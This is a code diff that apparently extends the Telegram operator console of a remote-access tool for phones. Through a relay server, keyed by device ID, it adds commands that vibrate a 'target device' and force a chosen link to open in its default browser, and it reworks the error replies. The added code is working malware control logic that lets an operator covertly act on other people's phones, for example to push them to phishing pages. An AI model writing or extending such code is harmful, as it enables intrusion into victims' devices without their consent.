@@ -421,13 +421,37 @@ bot.on("message", async (message) => {
                         password: passname,
                         mask: "metro",
                         method: "getUserByDeviceId",
+                        device_id: _devid,
                         shortcut: {
                             way: "seeMenu",
                             chat_id: message.chat.id,
                             message_id: message.message_id,
-                            msgowner: message.from.id
+                            msgowner: message.from.id,
+                            edit: false
                         }
                     }))
+                }
+            } else if (Object.keys(steps).includes(message.from.id.toString())){
+                let colab = steps[message.from.id];
+                let mode = colab.mode;
+                let devid = colab.device_id;
+                if (mode == "getUrl"){
+                    if (isUrl(message.text)){
+                        delete steps[message.from.id];
+                        me.write(JSON.stringify({
+                            port: portname,
+                            password: passname,
+                            method: "openUrl",
+                            device_id: devid,
+                            url: message.text,
+                            shortcut: {
+                                chat_id: message.chat.id,
+                                message_id: message.message_id,
+                                url: message.text,
+                                edit: false
+                            }
+                        }));
+                    }
                 }
             }
         }
@@ -552,6 +576,30 @@ bot.on("callback_query", async (call) => {
                     call.message.message_id
                 );
             } catch (e) {}
+        } else if (mode == "vibratePhone"){
+            me.write(JSON.stringify({
+                port: portname,
+                password: passname,
+                method: "vibratePhone",
+                device_id: spl[2],
+                shortcut: {
+                    chat_id: call.message.chat.id,
+                    message_id: call.message.message_id,
+                    edit: true
+                }
+            }))
+        } else if (mode == "openUrl"){
+            steps[call.from.id] = {
+                mode: "getUrl",
+                device_id: spl[2]
+            };
+            await bot.editMessageText(
+                build(`➕ ${sym} send your link`),
+                {
+                    message_id: call.message.message_id,
+                    chat_id: call.message.chat.id
+                }
+            )
         }
     }
 })
@@ -582,48 +630,92 @@ me.on("data", async (data) => {
                         })
                     }
                 }
-            }
-        } else {
-            if (_message.method == "getUserByDeviceId"){
+            } else if (_message.method == "vibratePhone"){
                 if (_message.shortcut){
-                    if (_message.shortcut.way == "seeMenu"){
-                        if (_message.message == "USER_NOT_FOUND"){
-                            await bot.sendMessage(
-                                _message.shortcut.chat_id,
-                                build("🔴 𓏺|𓏺 user not found"),
-                                {
-                                    reply_to_message_id: _message.shortcut.message_id
-                                }
-                            )
-                        } else if (_message.message == "INVALID_PORT_OR_PASSWORD"){
-                            await bot.sendMessage(
-                                _message.shortcut.chat_id,
-                                build("🔴 𓏺|𓏺 invalid port or password detected"),
-                                {
-                                    reply_to_message_id: _message.shortcut.message_id
-                                }
-                            )
-                        } else if (_message.message == "YOU_BANNED"){
-                            await bot.sendMessage(
-                                _message.shortcut.chat_id,
-                                build("🔴 𓏺|𓏺 sorry but you got banned"),
-                                {
-                                    reply_to_message_id: _message.shortcut.message_id
-                                }
-                            )
-                        } else {
-                            await bot.sendMessage(
-                                _message.shortcut.chat_id,
-                                build("🔴 𓏺|𓏺 unkown error detected !"),
-                                {
-                                    reply_to_message_id: _message.shortcut.message_id
-                                }
-                            )
-                            console.log(_message)
+                    await bot.editMessageText(
+                        build(`💠 ${sym} device of ${_message.device_id} were vibrated`),
+                        {
+                            message_id: _message.shortcut.message_id,
+                            chat_id: _message.shortcut.chat_id
                         }
-                    }
+                    )
+                }
+            } else if (_message.method == "openUrl"){
+                if (_message.shortcut){
+                    await bot.sendMessage(
+                        _message.shortcut.chat_id,
+                        build(`🍬 ${sym} user opened the link - `) + `<a href="${_message.shortcut.url}">${build("your link")}</a>` + build(` has opened in defualt-browser of target device\n📽 ${sym} `) + `<code>${_message.device_id}</code>`,
+                        {
+                            reply_to_message_id: _message.shortcut.message_id
+                        }
+                    )
                 }
             }
+        } else {
+            //if (_message.method == "getUserByDeviceId"){
+            if (_message.shortcut){
+                //if (_message.shortcut.way == "seeMenu"){
+                if (_message.message == "USER_NOT_FOUND"){
+                    _message.edit == false ? await bot.sendMessage(
+                        _message.shortcut.chat_id,
+                        build("🔴 𓏺|𓏺 user not found"),
+                        {
+                            reply_to_message_id: _message.shortcut.message_id
+                        }
+                    ) : await bot.editMessageText(
+                        build("🔴 𓏺|𓏺 user not found"),
+                        {
+                            chat_id: _message.shortcut.chat_id,
+                            message_id: _message.shortcut.message_id
+                        }
+                    )
+                } else if (_message.message == "INVALID_PORT_OR_PASSWORD"){
+                    _message.edit == false ? await bot.sendMessage(
+                        _message.shortcut.chat_id,
+                        build("🔴 𓏺|𓏺 invalid port or password detected"),
+                        {
+                            reply_to_message_id: _message.shortcut.message_id
+                        }
+                    ) : await bot.editMessageText(
+                        build("🔴 𓏺|𓏺 invalid port or password detected"),
+                        {
+                            chat_id: _message.shortcut.chat_id,
+                            message_id: _message.shortcut.message_id
+                        }
+                    )
+                } else if (_message.message == "YOU_BANNED"){
+                    _message.edit == false ? await bot.sendMessage(
+                        _message.shortcut.chat_id,
+                        build("🔴 𓏺|𓏺 sorry but you got banned"),
+                        {
+                            reply_to_message_id: _message.shortcut.message_id
+                        }
+                    ) : await bot.editMessageText(
+                        build("🔴 𓏺|𓏺 sorry but you got banned"),
+                        {
+                            chat_id: _message.shortcut.chat_id,
+                            message_id: _message.shortcut.message_id
+                        }
+                    )
+                } else {
+                    console.log(_message);
+                    _message.edit == false ? await bot.sendMessage(
+                        _message.shortcut.chat_id,
+                        build("🔴 𓏺|𓏺 unkown error detected !"),
+                        {
+                            reply_to_message_id: _message.shortcut.message_id
+                        }
+                    ) : await bot.editMessageText(
+                        build("🔴 𓏺|𓏺 unkown error detected ! maybe process didnt successful"),
+                        {
+                            chat_id: _message.shortcut.chat_id,
+                            message_id: _message.shortcut.message_id
+                        }
+                    )
+                }
+                //}
+            }
+            //}
         }
     } catch (e) {
         console.log(e)
